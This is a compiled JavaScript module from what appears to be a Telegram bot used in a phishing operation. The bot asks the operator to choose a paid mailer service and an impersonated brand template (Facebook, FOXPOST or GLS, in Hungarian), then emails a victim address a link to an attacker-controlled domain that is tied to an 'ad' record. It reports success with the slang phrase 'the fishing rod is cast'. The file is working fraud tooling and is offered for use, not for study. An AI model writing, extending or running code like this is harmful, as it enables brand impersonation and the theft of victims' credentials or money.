"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = exports.scene = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const database_1 = require("../../../database");
const deleteAllMessages_1 = require("../../../helpers/deleteAllMessages");
const email_1 = require("../../../utils/rassilka/email");
const console_1 = __importDefault(require("console"));
const getDomen_1 = require("../../../helpers/getDomen");
exports.scene = new grammy_scenes_1.Scene('emailSendFacebook');
exports.composer = new grammy_1.Composer();
const regex = /email facebook hu ad (?<id>\d+)/gmi;
exports.composer.callbackQuery(regex, handler);
async function handler(ctx) {
    const match = regex.exec(ctx.callbackQuery.data);
    const id = match.groups.id;
    await ctx.scenes.enter('emailSendFacebook', {
        id
    });
}
async function cancel(ctx) {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
}
exports.scene.always().callbackQuery('cancel emailSendFacebookFacebook', cancel);
exports.scene.do(async (ctx) => {
    ctx.session.smsEmail = { ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: undefined };
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply("<b>🌳 Выбери мейлера:</b>", {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('YourMailer | 5%', 'yourmailer')
            .row()
            .text('Отмена', 'cancel emailSend')
    });
    ctx.session.deleteMessage = [msg.message_id];
    ctx.scene.resume();
});
exports.scene.wait().callbackQuery(/keshmail|yourmailer|depa/, async (ctx) => {
    ctx.session.smsEmail.who = ctx.callbackQuery.data;
    try {
        ctx.deleteMessage();
    }
    catch (e) { }
    if (ctx.callbackQuery.data === 'depa') {
        if (ctx.user.email <= 0) {
            return ctx.answerCallbackQuery({
                show_alert: true,
                text: `🐨 [DEPA] У тебя доступно 0 сообщений`
            });
        }
    }
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const keyb = new grammy_1.InlineKeyboard();
    if (ctx.callbackQuery.data === 'depa'
        || ctx.callbackQuery.data === 'yourmailer') {
        keyb.text('FACEBOOK', '2facebook');
        keyb.row();
    }
    keyb.text('FOXPOST', 'foxpost');
    keyb.row();
    keyb.text('GLS', 'gls');
    keyb.row();
    keyb.text('Отмена', 'cancel emailSendFacebook');
    const msg = await ctx.reply("<b>🪤 Выбери сервис:</b>", {
        reply_markup: keyb
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().callbackQuery(/2facebook|gls|foxpost/, async (ctx) => {
    if (ctx.callbackQuery.data == "2facebook") {
        ctx.session.smsEmail.service = ctx.callbackQuery.data.slice(1, ctx.callbackQuery.data.length);
    }
    else {
        ctx.session.smsEmail.service = ctx.callbackQuery.data;
    }
    try {
        ctx.deleteMessage();
    }
    catch (e) { }
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply("<b>📨 Введи e-mail:</b>", {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel emailSendFacebook')
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on('message:text', async (ctx) => {
    ctx.session.smsEmail.to = ctx.msg.text;
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    if (ctx.session.smsEmail.service === 'foxpost')
        ctx.session.smsEmail.pattern = "FOXPOST_HU@!!@eu";
    if (ctx.session.smsEmail.service === 'gls')
        ctx.session.smsEmail.pattern = "GLS_HU@!!@eu";
    if (ctx.session.smsEmail.service === 'facebook')
        ctx.session.smsEmail.pattern = "facebook_HU@!!@2.0";
    const domen = await (0, getDomen_1.getDomen)(ctx.user, ad.service);
    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply(`⏳`);
    console_1.default.log(ctx.session.smsEmail.pattern);
    if (ctx.session.smsEmail.who === 'yourmailer') {
        const response = await (0, email_1.sendEmailYourMailer)(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, `https://${domen.link}/${(ctx.session.smsEmail.service === "gls" || ctx.session.smsEmail.service === "foxpost") ? 'service/' + ctx.session.smsEmail.service + '/' : 'link/'}${ad.link}/yourmailer`, ctx.from.id);
        try {
            ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
        }
        catch (e) { }
        console_1.default.log(response, 'yourmailer');
        await ctx.reply((response === "The message has been sent")
            ? `✅ Удочка закинута`
            : `⚠️ Не удалось отправить письмо`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
    }
    else if (ctx.session.smsEmail.who === 'anafema') {
        let service = undefined;
        if (ctx.session.smsEmail.service === 'foxpost')
            ctx.session.smsEmail.pattern = "146";
        if (ctx.session.smsEmail.service === 'gls')
            ctx.session.smsEmail.pattern = "314";
        if (ctx.session.smsEmail.service === 'facebook')
            ctx.session.smsEmail.pattern = "228";
        const response = await (0, email_1.sendEmailAnafema)(String(ctx.from.id), String((ctx.from?.username) ? ctx.from?.username : 'none'), ctx.session.smsEmail.to, `https://${domen.link}/${(ctx.session.smsEmail.service === "gls" || ctx.session.smsEmail.service === "foxpost") ? 'service/' + ctx.session.smsEmail.service + '/' : 'link/'}${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`, Number(ctx.session.smsEmail.pattern), ad.date);
        try {
            ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
        }
        catch (e) { }
        console_1.default.log(response, 'anafema');
        await ctx.reply((response)
            ? `✅ Удочка закинута`
            : `⚠️ Не удалось отправить письмо`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
    }
    else if (ctx.session.smsEmail.who === 'keshmail') {
        if (ctx.session.smsEmail.service === 'foxpost')
            ctx.session.smsEmail.pattern = "foxpost.hu";
        if (ctx.session.smsEmail.service === 'gls')
            ctx.session.smsEmail.pattern = "gls.hu";
        if (ctx.session.smsEmail.service === 'facebook') {
            await ctx.scene.exit();
            return ctx.answerCallbackQuery({
                show_alert: true,
                text: 'facebook.hu недоступен в кеше'
            });
        }
        const response = await (0, email_1.sendEmailKeshMail)(String(ctx.from.id), String((ctx.from?.username) ? ctx.from?.username : 'none'), ctx.session.smsEmail.to, `https://${domen.link}/link/${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`, ctx.session.smsEmail.pattern, ad.date);
        try {
            ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
        }
        catch (e) { }
        console_1.default.log(response, 'keshmail');
        await ctx.reply((response)
            ? `✅ Удочка закинута`
            : `⚠️ Не удалось отправить письмо`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
    }
    else if (ctx.session.smsEmail.who === 'depa') {
        await (0, email_1.preSendEmailDepa)(ctx, ad, domen, msg, ctx.session.smsEmail.service);
    }
    return cancel(ctx);
});
